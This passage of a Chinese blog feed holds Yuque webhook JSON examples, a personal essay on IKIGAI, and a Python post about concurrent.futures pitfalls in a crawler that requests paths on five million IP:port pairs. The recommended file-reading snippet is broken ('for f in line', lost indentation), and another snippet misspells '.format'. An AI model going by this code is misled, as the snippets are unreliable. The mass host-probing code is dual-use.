class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857191&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_update&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_update&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="删除评论回复"><a href="#删除评论回复" class="headerlink" title="删除评论回复"></a>删除评论回复</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857191</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-number">857190</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;更新评论回复&lt;/p&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:35.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">2</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:55.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:43.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857191&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_delete&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_delete&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于官方没有对各个字段的说明，所以我们也只能先把webhook的具体内容记录下来，再做具体分析。我自己折腾的时候，也是借助<a href="https://webhook.site/">webhook.site</a>，手动更新知识库，一条一条对，太麻烦了，希望能帮到其他遇到这个坑的帖子吧。</p><p>个人认为path、action_type之类的字段比较重要吧，其他的什么自己去研究下就行了。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>语雀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生活的意义？我想聊聊IKIGAI</title>
    <link href="/posts/1a376f79.html"/>
    <url>/posts/1a376f79.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>睡眼惺忪地向前走，独特的幽香突然就充盈了整个鼻腔，整个人也随之精神了起来。四处打探，发现不远就是桂花院，嗯，是桂花香。忍不住再贪婪地猛吸两口清香的空气，然后就开心地上学去了。</p></blockquote><p>我小时候生活的院子里有一棵桂花树，上面说的是便是它，那是一棵两三个人才能抱得住的桂花树，枝叶繁茂，整个院子都在它的树荫之下，我们把那个院子称为桂花院。桂花是一种非常独特的植物，平时看起来并不起眼，你甚至会忘记它的存在。但一夜之间，它会用独特的香气会瞬间唤起你的记忆。嗅觉过后，便是远看遍地金黄，近看颗粒分明的桂花瓣，静静铺满整个地面，吸引着你的视觉。小时候总是习惯绕着走，舍不得踩上去。<strong>我的乡愁，大概是桂花吧！</strong></p><h1 id="开头的碎碎念"><a href="#开头的碎碎念" class="headerlink" title="开头的碎碎念"></a>开头的碎碎念</h1><p>前面是一些题外话，上班的园区种着几棵三指粗的桂花树，平时在园区散步并没有注意到路边的这些植物，最近桂花开了，气味唤起了记忆，挺奇妙，所以这篇文章开头提一嘴。</p><p>我有很长时间没有更新文章了，七月份在准备公务员考试，本来计划着考完试就好好更新文章，结果这两个月经历了挺多事。其实说是准备考试，实际上因为和女朋友吵架主动冷战，根本静不下心。铁子们，真的<strong>家和万事兴</strong>。有一段稳定的感情，对工作、生活都挺重要的，不然无尽头的争吵你做啥事都一点心思没有。当然，考试的结果你们也猜到了，肯定没有过，毕竟我是个普通人，我的智商碾压不了别人付出的努力。进面210分，我考了190分，意料之中吧。</p><p>和冯冯吵了半年的架，不完全统计，光冷战就经历了141天。其实根本的原因，是我对她有一些负面的情绪，我以为自己能消化，没想到越积越多，根本消化不了。所以情侣之间，有心结，有负面情绪，一定得以双方都接受的方式去沟通解决，毕竟是恋爱是两个人的事，一个人消化不来的。不过还是很庆幸吧，虽然很多做法对女票伤害很深，她还是原谅我啦，我们现在和好如初，很感激她。</p><h1 id="这篇文章想说啥？"><a href="#这篇文章想说啥？" class="headerlink" title="这篇文章想说啥？"></a>这篇文章想说啥？</h1><p>这篇文章，我想聊聊<strong>IKIGAI</strong>。IKIGAI是我看DannyData视频提到的一个概念，其实当时看到这个概念就想写一篇文章了，但一直拖到了现在。<strong>IKIGAI翻译自日语，意思是生活的意义</strong>。这其实不是一个很空的话题，相反，我觉得它非常的现实，对我们安排自己实际的日常生活、学习很重要。</p><p>以我自己为例子，我最近想干很多事，但似乎每天什么事也没干，时间就没有了：</p><ul><li><p>比如我喜欢电子设计，那折腾一些电子设计的小玩意儿我就很开心，我想在这花一些时间；</p></li><li><p>比如给别人弹钢琴伴奏，也许是一个能赚钱，那为了这个事投入一些精力，理所当然，我想在这花一些时间；</p></li><li><p>比如我觉得自己折腾或者对生活的看法，以文章的形式展现出来，会帮助到其他人，我想在这花一些时间。</p></li></ul><p>你看，折腾电子设计需要时间，学习即兴伴奏需要时间，写文章需要时间。每一个点都需要大量时间，那每天晚上回到家，如何安排这些事，就成了问题。<strong>当你完全没有优先级的时候，就会发现，自己什么都不想做，时间就在思想斗争中流逝了。</strong></p><p>你也许会说，那你应该向罗老师学习一下时间管理呀。也许真有用，但我还是想和各位聊聊IKIGAI。</p><h1 id="聊聊IKIGAI"><a href="#聊聊IKIGAI" class="headerlink" title="聊聊IKIGAI"></a>聊聊IKIGAI</h1><p>IKIGAI说的实际上是四个事：你热爱什么、你擅长做的是、你能靠什么赚钱、世界需要的事。对我而言：</p><ul><li>我喜欢电子设计，电子设计就是我热爱的事。</li><li>给别人弹钢琴伴奏，也许是一个能赚钱，那学习即兴伴奏也许是未来能赚钱的事。</li><li>写文章，让更多人看到，能让他们少走弯路，那这个就是世界需要的事。</li><li>啥？你问为啥没有擅长的事，作为社畜，惨遭社会毒打，我真不知道自己擅长啥。大概，吃喝？</li></ul><center><img src="https://pic.gaficat.com/default/IKIGAI.png" alt="IKIGAI" style="zoom: 67%;" /></center><p>IKIGAI说的四个事，实际上就是上面这张图里的四个大圆圈，如果只满足其中一个圆，那肯定离生活圆满比较远。如果是同时满足两个圆呢？</p><ul><li><strong>做自己热爱且擅长的事，能让人保持热情。</strong>比如我喜欢电子设计，事实上我自认为自己还挺擅长的，所以我对这件事一直比较有热情。</li><li><strong>做自己擅长且能赚钱的事，那就很专业，变身职业达人。</strong>那这个我就没资格说了，我不是职业达人，T.T~</li><li><strong>做世界需要且能赚钱的事，就能获得成就感和自我价值。</strong>比如我从事网络安全的研究工作，与黑产对抗，并且公司给我发钱，那我就很有成就感。</li><li><strong>做自己热爱并且世界需要的事，高尚且受人尊重。</strong>比如乡村教师、守卫边疆的战士。</li></ul><p>现实生活中，有很多找到了自己IKIGAI的人，无论是魅族合作的晓芳窑蔡晓芳先生；还是曾经在NBA大展身手的篮球巨星姚明。他们找到了自己的IKIGAI，自己的钟爱之事、擅长之能、必履之责、营生之业，真的很让人羡慕。</p><p>当然啦，作为社畜的我们，生存都已经很困难了，哪还有时间分清IKIGAI说的这四件事对应到自己身上到底是什么，然后去找交集、付诸行动呢？我自己也是这样。但虽然生活艰难，人间不值得。我还是认为应该花时间弄清楚自己的IKIGAI，毕竟搞清楚自己的IKIGAI，就会活的通透些。生活已经这么苦了，再苦能怎样，苦中作乐，说不定能让自己的生活柳暗花明呢！</p><h1 id="坐而论道不如起而行之"><a href="#坐而论道不如起而行之" class="headerlink" title="坐而论道不如起而行之"></a>坐而论道不如起而行之</h1><p>我们普通人，很难像精英一样找到自己四个圈的交集，去追求完美的IKAGAI，自己喜欢的事赚不了钱，赚钱的事自己不喜欢，都很正常。如果一定要舍弃一样，我个人会舍弃掉世界需要的事（自己如果有空余时间，那当然可以去做，你会获得认同感），相比其他的事，这件事优先级低。我就是一个俗人，身为凡人的我，多赚钱，让自己和家人生活质量更好，这是我能真切感受到的。</p><p>所以我个人认为应该专注于自己热爱的事、擅长的事以及能赚钱的事，努力找到这三个圈的交集。因为这三件圈的交集，能让你保持热情，能让你赚到钱，改善你的生活。吃都吃不饱，房都买不起房，女票都找不到，谈何社会需要我去做一些事，谈何社会责任感，认同感。</p><p>那么，<strong>第一步，找到自己喜欢的事，自己的爱好。</strong>进入社会，遭遇工作、感情的不如意，太正常了。这个时候，太需要一件能宣泄自己情绪的事了，这件事可以是一种乐器，可以是唱歌，可以是画画，可以是书法、可以是拼积木，可以是做菜等等。</p><p>接下来，<strong>第二步，当我们在尝试不同兴趣爱好的时候，很容易就能找到喜欢之事和擅长之事的交集。</strong>比如突然发现自己是吉他小天才，上手就各种和弦弹得飞起。突然发现自己做菜很棒，不同菜品伸手就来。人天生就是懒惰的，就是不喜欢学习的。那么在兴趣的推动下，我们就能很容易克服天性，去学习一件事情，结果，后来意外发现这件事自己比别人上手快，有天赋，自然就会对这些事充满热情。</p><p>最后呢，<strong>第三步，擅长、热爱的事，逐渐的就能转化成一些能赚钱的事。</strong>比如摄影，可以向杂志投稿获取稿费。比如厨艺，拍短视频，像麻辣德子，就可能流量变现。比如乐器，就能分享自己学习的过程，知识付费。总之，随着你眼界不断的开拓，你就会发现越来越多赚钱的途径。</p><blockquote><p>言论：<strong>当然，你只能赚到你认知范围内的钱。但愿我的读者们能看清未来的趋势，这样就能多一些准备。凡事预则立。</strong>——今天看到的一篇文章：<a href="https://tumutanzi.com/archives/16741">土木坛子</a></p></blockquote><p>坐而论道不如起而行之，我还是希望大家动起来，去寻找自己的兴趣。因为兴趣是一切的起点，随着了解的越多，你就越能扩大自己的认知范围，认知范围大，你就能赚到更多的钱，能改善自己的生活。没有这个起点，哪有后续。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p><strong>我自己的生活也是一地鸡毛，我觉得我没有资格对别人如何生活指手画脚，但还是希望把自己的想法分享出来，也许有人也认同呢？</strong></p><p>写这篇文章的目的，是希望大家能动起来，找到自己的兴趣，擅不擅长不重要，能不能赚钱不重要，毕竟，还没有开始动呢，对吧！切忌一开始把赚钱看的太重了，因为当你把钱看的很重的时候，一旦你做的那件事，短时间内很难转化出赚钱的方法，或者你看不到赚钱的希望，就很容易产生放弃的念头。</p><blockquote><p>言论：一开始学习即兴伴奏我动力很足，觉得自己喜欢，也擅长，并且未来无论是去钢伴演出还是教学生，可以转化成赚钱的途径。但后来，生活所迫，太希望把这件事转化成赚钱的手段而忘记了初衷（那就是爱好），一旦遇到困难，退缩，厌倦的心态就产生了。——我自己</p></blockquote><p>冯冯最近开始找自己的爱好了，这一点是我挺吃惊的。因为我跟冯冯说过很多次了，去找一个自己的兴趣爱好，不然当生活遇到负面情绪，只能对另一半发火。冯冯现在开始唱歌，开始学习剪辑视频，虽然一开始不是很熟练，但是乐在其中。我问她：“你说剪视频能转化成啥赚钱的途径不?除了UP主。”</p><p>冯冯说：“唔，好像没啥了？不过，只是<strong>当成一种兴趣嘛，自己消遣喜欢，不也挺好吗？为什么啥都要和钱扯上关系呢？</strong>”</p><p>每个人的IKIGAI都不一样，有的人找到一个符合自己圈就很困难了，有的人可以轻松的找到四个圈。但无论是一个还是四个，还是希望看文章的各位，都能想想自己的IKIGAI，快快动起来吧。</p>]]></content>
    
    
    <categories>
      
      <category>奇怪的知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>奇怪的知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>concurrent和requests的那些坑</title>
    <link href="/posts/f471d42d.html"/>
    <url>/posts/f471d42d.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这篇文章记录了一下python concurrent.future和requests的一些坑，不是程序猿的铁子们直接关掉吧。</p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近在写一个爬虫，需要爬5000000个IP，待爬的IP以<code>IP,PORT</code>的形式存储在一个100Mb的文件中。这么粗略算一下，一秒钟一个IP，5000000个IP需要差不多57天，这肯定不行啊，得用多线程。但是使用的过程中，发现还是遇到了很多坑，这里分享出来，以免其他小伙伴踩我踩过的坑吧。</p><h1 id="先说结论"><a href="#先说结论" class="headerlink" title="先说结论"></a>先说结论</h1><p>节约大家时间，先说结论吧！我遇到了以下几个坑：</p><ul><li><p><strong>不要一次将大文件的内容读到一个列表中</strong>。5000000个IP，虽然文件看起来只有100Mb，但程序直接怼到列表中，内存爆了。尽量读一行处理一行，即使用以下的形式读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;file&quot;</span>) <span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> line:<br>print(f)<br></code></pre></td></tr></table></figure></li></ul><ul><li><p><strong>使用多线程时，处理函数一定一定一定一定不要阻塞，concurrent.futures只有当所有子线程运行结束后，才会释放资源</strong>。</p></li><li><p><strong>requests库在处理某些请求时会阻塞卡死。</strong>上面刚说多线程不要阻塞，这里就阻塞了。实际上是这次我爬取的过程中，发现了部分奇葩的IP，使用requests的timeout参数对它们无效，会始终阻塞。</p></li><li><p><strong>可以了解一下eventlet库的Timeout</strong>。如果实在无法解决某些处理流程中（比如上面requests）的阻塞，建议使用eventlet库的Timeout。</p></li></ul><h1 id="曲折历程"><a href="#曲折历程" class="headerlink" title="曲折历程"></a>曲折历程</h1><h2 id="读IP干爆内存"><a href="#读IP干爆内存" class="headerlink" title="读IP干爆内存"></a>读IP干爆内存</h2><p>一开始要做这个爬虫的时候，我想要用多线程，自然而然想到了<code>concurrent.futures</code>，参考说明文档的示例，我写了<strong>第一版程序</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_url</span>(<span class="hljs-params">ip, port</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/path&quot;</span>.foramt(ip, port), timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;123.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-comment"># submit所有IP</span><br>            future_dict = &#123;executor.submit(get_url, line.strip().split(<span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>], line.strip().split(<span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">1</span>]): line.strip().split(<span class="hljs-string">&quot;,&quot;</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f&#125;<br>            print(len(future_dict))<br>            <br>        <span class="hljs-comment"># 等待所有线程执行完毕</span><br>        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_dict):<br>            ip_port = future_dict[future]<br>            <span class="hljs-keyword">try</span>:<br>                data = future.result()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>                print(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (ip_port, exc))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># print(data)</span><br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>我当时发现，内存直接被干爆了。为什么？其实程序中的<strong>18行</strong>已经有答案了。<code>concurrent.future</code>官方的示例中，会将所有<code>future</code>对象存到一个字典中，然后再等待所有线程执行完毕。虽然用了<code>for line in f</code>这种形式迭代，但5000000的<code>future</code>对象，还是太大了。</p><p>那咋办嘛？就控制<code>future_dict</code>的长度呗，规定一个长度，执行完毕直接释放内存，所以我使用了<code>Queue</code>，保证传入<code>future_dict</code>的内容大小始终可控，<strong>第二版代码</strong>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> ctime<br><br>ip_queue = queue.Queue(<span class="hljs-number">100</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_url</span>(<span class="hljs-params">ip, port</span>):</span><br>    <span class="hljs-keyword">try</span>:<br><br>        r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/path_info&quot;</span>.format(ip, port),<br>                         timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> e<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    future_dict = &#123;&#125;<br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;./ipfile&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip_queue.full():<br>                ip_queue.put(line.strip().split(<span class="hljs-string">&quot;,&quot;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>                    <span class="hljs-keyword">while</span> <span 